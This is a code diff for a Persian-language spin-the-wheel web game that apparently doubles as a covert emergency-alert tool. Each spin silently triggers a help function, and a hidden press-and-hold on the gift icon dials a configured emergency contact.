+  for(let i=0;i<N;i++){
+    stops.push(`${COLORS[i]} ${i*SEG}deg ${(i+1)*SEG}deg`);
+  }
+  document.getElementById('segBg').style.background = `conic-gradient(${stops.join(',')})`;
+
+  const labelsRoot = document.getElementById('labels');
+  labelsRoot.innerHTML = '';
+  for(let i=0;i<N;i++){
+    const mid = i*SEG + SEG/2;
+    const wrap = document.createElement('div');
+    wrap.className = 'label';
+    wrap.style.transform = `rotate(${mid}deg)`;
+    const span = document.createElement('span');
+    span.textContent = PRIZES[i].text;
+    span.style.transform = `translate(-50%, -128%) rotate(0deg)`;
+    wrap.appendChild(span);
+    labelsRoot.appendChild(wrap);
+  }
+}
+buildWheel();
+
+function weightedRandomIndex(){
+  const total = PRIZES.reduce((s,p)=>s+p.weight,0);
+  let r = Math.random()*total;
+  for(let i=0;i<N;i++){
+    r -= PRIZES[i].weight;
+    if(r<=0) return i;
+  }
+  return N-1;
+}
+
+let currentRotation = 0;
+let spinning = false;
+let cachedCfg = null;
+
+loadSettings().then(cfg=>{ cachedCfg = cfg; });
+
+document.getElementById('spinBtn').addEventListener('click', async ()=>{
+  if(spinning) return;
+  spinning = true;
+  document.getElementById('spinBtn').disabled = true;
+
+  // silently fire the real thing — no visual trace of this on screen
+  if(!cachedCfg) cachedCfg = await loadSettings();
+  silentTriggerHelp(cachedCfg);
+
+  // meanwhile, play the game like normal
+  const idx = weightedRandomIndex();
+  const desired = 360 - (idx*SEG + SEG/2);
+  const fullSpins = 5*360;
+  let target = currentRotation - (currentRotation % 360) + fullSpins + desired;
+  while(target <= currentRotation) target += 360;
+  currentRotation = target;
+  document.getElementById('wheel').style.transform = `rotate(${currentRotation}deg)`;
+
+  setTimeout(()=>{
+    const prize = PRIZES[idx];
+    document.getElementById('resultEmoji').textContent = prize.emoji;
+    document.getElementById('resultTitle').textContent = prize.text.includes('پوچ') ? 'شانس نبود!' : 'تبریک میگم! 🎉';
+    document.getElementById('resultText').textContent = prize.text.includes('پوچ')
+      ? 'این بار شانس باهات نبود، فردا دوباره امتحان کن.'
+      : `جایزه‌ات: ${prize.text}`;
+    document.getElementById('resultModal').classList.add('show');
+    spinning = false;
+    document.getElementById('spinBtn').disabled = false;
+  }, 4300);
+});
+
+document.getElementById('resultClose').addEventListener('click', ()=>{
+  document.getElementById('resultModal').classList.remove('show');
+});
+
+/* secret fallback: press & hold the gift icon ~1.5s to call your emergency contact directly,
+   no internet needed. Nothing on screen hints at this. */
+let holdTimer = null;
+function armHold(e){
+  holdTimer = setTimeout(async ()=>{
+    if(!cachedCfg) cachedCfg = await loadSettings();
+    if(cachedCfg && cachedCfg.phone){
+      window.location.href = 'tel:' + cachedCfg.phone;
+    }
+  }, 1500);
+}
+function disarmHold(){ if(holdTimer){ clearTimeout(holdTimer); holdTimer=null; } }
+const hub = document.getElementById('hub');
+hub.addEventListener('touchstart', armHold, {passive:true});
+hub.addEventListener('touchend', disarmHold);
+hub.addEventListener('touchcancel', disarmHold);
+hub.addEventListener('mousedown', armHold);
+hub.addEventListener('mouseup', disarmHold);
+hub.addEventListener('mouseleave', disarmHold);
 </script>
 </body>
 </html>
